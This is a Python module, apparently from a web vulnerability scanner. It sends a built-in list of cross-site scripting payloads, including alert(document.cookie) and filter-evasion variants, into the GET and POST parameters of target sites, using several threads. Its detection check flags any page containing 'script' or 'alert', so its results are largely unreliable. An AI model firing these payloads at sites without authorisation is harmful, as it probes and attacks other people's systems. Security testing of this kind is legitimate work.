# fuzzers/xss.py
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
import requests

class XSS:
    def __init__(self, session, threads=5):
        self.session = session
        self.threads = threads
        self.payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            '<script>alert(document.cookie)</script>',
            '<img src="#" onerror=alert(document.cookie)>',
            '<body onload=alert("XSS")>',
            '<scr<script>ipt>alert(document.cookie)</script>',
            '#</select><img src=1 onerror=alert(document.cookie)>'
        ]
        self.indicators = ['alert', 'script', 'onerror']  # Keywords to detect XSS

    def set_payloads(self, payload_list):
        """
        Set custom payloads from a list.
        """
        self.payloads = payload_list

    def filter_targets(self, targets):
        """
        Filter targets to find those with parameters that could be vulnerable to XSS.
        """
        xss_targets = []
        for target in targets:
            for param in target.get('params', []):
                if 'text' in param['html_type'] or 'textarea' in param['html_type']:
                    xss_targets.append(target)
                    break
        return xss_targets

    def test_target(self, target):
        """
        Test a target for XSS vulnerabilities using the defined payloads.
        """
        results = []
        print(f"{Fore.CYAN}[*] Testing target: {target['url']}{Style.RESET_ALL}")
        for param in target['params']:
            print(f"{Fore.CYAN}[*] Testing parameter: {param['name']}{Style.RESET_ALL}")
            for payload in self.payloads:
                try:
                    if param['type'] == 'GET':
                        print(f"{Fore.CYAN}[*] Injecting payload: {payload} into GET parameter: {param['name']}{Style.RESET_ALL}")
                        req = self.session.get(
                            target['url'],
                            params={param['name']: payload},
                            timeout=7
                        )
                    else:
                        print(f"{Fore.CYAN}[*] Injecting payload: {payload} into POST parameter: {param['name']}{Style.RESET_ALL}")
                        req = self.session.request(
                            param['type'],
                            target['url'],
                            data={param['name']: payload},
                            timeout=7
                        )
                    
                    if req.status_code == 200 and self.detect_vulnerability(req):
                        print(f"{Fore.GREEN}[+] Potential XSS found at {target['url']} with parameter {param['name']}{Style.RESET_ALL}")
                        results.append({
                            'type': 'XSS',
                            'url': req.url,
                            'param': param['name'],
                            'payload': payload,
                            'status': req.status_code,
                            'length': len(req.content),
                            'source': target['source']
                        })
                except Exception as e:
                    print(f"{Fore.RED}[!] Error testing target {target['url']}: {str(e)}{Style.RESET_ALL}")
                    continue
        return results

    def detect_vulnerability(self, response):
        """
        Detect if the response indicates a potential XSS vulnerability.
        """
        content = response.text.lower()
        return any(ind in content for ind in self.indicators)

    def fuzz(self, targets):
        """
        Fuzz a list of targets for XSS vulnerabilities.
        """
        filtered = self.filter_targets(targets)
        print(f"{Fore.CYAN}[*] Testing {len(filtered)} targets for XSS{Style.RESET_ALL}")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.test_target, t) for t in filtered]
            results = [r for future in futures for r in future.result() if r]
        
        return results